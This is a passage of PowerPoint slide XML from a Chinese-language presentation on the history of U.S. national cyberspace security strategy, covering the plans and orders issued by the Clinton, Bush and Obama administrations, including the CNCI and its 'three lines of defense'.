              <a:gd name="adj2" fmla="val -1298"/>
              <a:gd name="adj3" fmla="val 25556"/>
              <a:gd name="adj4" fmla="val -130356"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>2000</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>月，克林顿政府发布了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息系统保护国家计划</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>V1.0》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，提出了美国政府在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>21</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>世纪之初若干年的网络空间安全发展规划。 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110610" name="AutoShape 18"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7515509" y="3137866"/>
            <a:ext cx="1512887" cy="3267507"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 51312"/>
              <a:gd name="adj2" fmla="val -1298"/>
              <a:gd name="adj3" fmla="val 17535"/>
              <a:gd name="adj4" fmla="val -32610"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>2001</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>16</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>日，布什政府意识到了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>911</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>之后信息安全的严峻性，发布了第</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>13231</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>号行政令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>信息时代的关键基础设施保护</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，宣布成立“总统关键基础设施保护委员会”，简称</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>PCIPB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>，代表政府全面负责国家的网络空间安全工作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="110611" name="AutoShape 19"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="3429000"/>
            <a:ext cx="1512888" cy="2692400"/>
          </a:xfrm>
          <a:prstGeom prst="borderCallout1">
            <a:avLst>
              <a:gd name="adj1" fmla="val 56764"/>
              <a:gd name="adj2" fmla="val 101298"/>
              <a:gd name="adj3" fmla="val 97463"/>
              <a:gd name="adj4" fmla="val 226968"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF00"/>
          </a:solidFill>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>2003</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>月，在征求国民意见的基础上，发布了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>保护网际空间的国家战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>的正式版本，对原草案版本做了大篇幅的改动，重点突出国家政府层面上的战略任务，这是一个非常大的跨越</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 20"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3204736" y="2130540"/>
            <a:ext cx="2503488" cy="2938308"/>
            <a:chOff x="-164" y="-30"/>
            <a:chExt cx="1577" cy="1900"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="9231" name="Picture 21" descr="美国国徽"/>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 y="-30"/>
              <a:ext cx="894" cy="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2" name="Rectangle 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="-164" y="1436"/>
              <a:ext cx="1577" cy="434"/>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1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>            2010</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>年</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>3</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>月</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>2</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>日， </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>奥巴马政府部分解密了</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>CNCI</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>， </a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>包括</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>3</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>个重要目标，</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>12</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>个倡议 </a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9219" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="169541" y="575826"/>
            <a:ext cx="8496944" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国网络空间安全保障战略：一个轮回 三届政府 四个文件</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1174886162"/>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upRigh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10608"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="strips(downRight)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1106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trips(downRigh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10609"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="strips(downLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1106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12"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strips(downLeft)">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110610"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="strips(downLeft)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="1106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12"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strips(downLeft)">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110611"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="strips(downRight)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11061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6" presetClass="entr" presetSubtype="32"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circle(out)">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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110595"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="strips(downRight)">
                                      <p:cBhvr>
                                        <p:cTn id="52" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="110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animBg="1"/>
      <p:bldP spid="110608" grpId="0" animBg="1" autoUpdateAnimBg="0"/>
      <p:bldP spid="110609" grpId="0" animBg="1" autoUpdateAnimBg="0"/>
      <p:bldP spid="110610" grpId="0" animBg="1" autoUpdateAnimBg="0"/>
      <p:bldP spid="110611"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3" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="731104"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>美国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CNCI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：网络“曼哈顿计划”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10244" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="2852936"/>
            <a:ext cx="7848872" cy="2179463"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>三道防线</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>建立第一线防御：减少当前漏洞和隐患，预防入侵；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>全面应对各类威胁：增强反间能力，加强供应链安全来抵御各种威胁；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>强化未来安全环境：增强研究、开发和教育以及投资先进的技术来构建将来的环境。 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1691074"/>
            <a:ext cx="8208912" cy="1074140"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2008</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>年</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>月</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>日发布的国家安全总统令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>54/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国土安全总统令</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>，建立了国家网络安全综合计划</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>(CNCI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2200" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>主要目标：“三道防线”、“十二项提议”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3127044189"/>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576476" y="1418810"/>
            <a:ext cx="6744072" cy="4865947"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
